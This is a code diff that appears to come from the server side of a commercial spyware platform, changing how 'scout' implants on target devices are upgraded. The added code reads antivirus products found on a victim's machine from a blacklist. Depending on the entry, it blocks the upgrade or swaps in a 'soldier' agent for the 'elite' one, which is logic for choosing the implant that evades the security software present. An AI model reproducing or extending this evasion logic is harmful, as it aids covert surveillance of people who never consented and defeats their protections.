@@ -349,7 +349,8 @@ class Item
 
       build.clean
     end
-
+  rescue Exception => e
+    trace :error, "Cannot add first time upload: #{e.message}"
   end
 
   def add_upgrade(name, file)
@@ -372,10 +373,10 @@ class Item
       raise "Compromised scout cannot be upgraded" if self.version <= 3
       
       # check the presence of blacklisted AV in the device evidence
-      blacklisted_software?
+      method = blacklisted_software?
 
       # if it's a scout, there a special procedure
-      return upgrade_scout
+      return upgrade_scout(method)
     end
 
     # in case of elite leak
@@ -429,7 +430,10 @@ class Item
     self.save
   end
 
-  def upgrade_scout
+  def upgrade_scout(method)
+
+    #TODO: build elite or soldier
+
     factory = ::Item.where({_kind: 'factory', ident: self.ident}).first
     build = RCS::DB::Build.factory(self.platform.to_sym)
     build.load({'_id' => factory._id})
@@ -572,6 +576,8 @@ class Item
   end
 
   def blacklisted_software?
+    upgrade_method = :elite
+
     raise BlacklistError.new("Cannot determine blacklist") if self._kind != 'agent'
 
     device = Evidence.target(self.path.last).where({type: 'device', aid: self._id.to_s}).last
@@ -586,14 +592,27 @@ class Item
         offending.strip!
         offending.chomp!
         next unless offending
-        bver, bbit, bmatch = offending.split('|')
+
+        # format is:
+        # scout version | scout/offline | soldier/blacklist | architecture | AV software
+        bver, bmethod, btype, bbit, bmatch = offending.split('|')
+
+        # bmethod is # for online or * for online/offline
+
         bver = bver.to_i
         trace :debug, "Checking for #{bmatch} | #{bver} <= #{self.version.to_i} | bit: #{bbit}"
+
         if Regexp.new(bmatch, Regexp::IGNORECASE).match(installed) != nil &&
            (bver == 0 || self.version.to_i <= bver) &&
            (bbit == '*' || installed.match(/Architecture: /).nil? || Regexp.new("Architecture: #{bbit}", Regexp::IGNORECASE).match(installed) != nil)
           trace :warn, "Blacklisted software detected: #{bmatch} (#{bbit})"
-          raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+          case btype
+            when 'B'
+              raise BlacklistError.new("The target device contains a software that prevents the upgrade.")
+            when 'S'
+              # create the soldier instead of elite
+              upgrade_method = :soldier
+          end
         end
       end
     end
@@ -610,6 +629,7 @@ class Item
       end
     end
 
+    return upgrade_method
   end
 
   def self.offload_destroy(params)
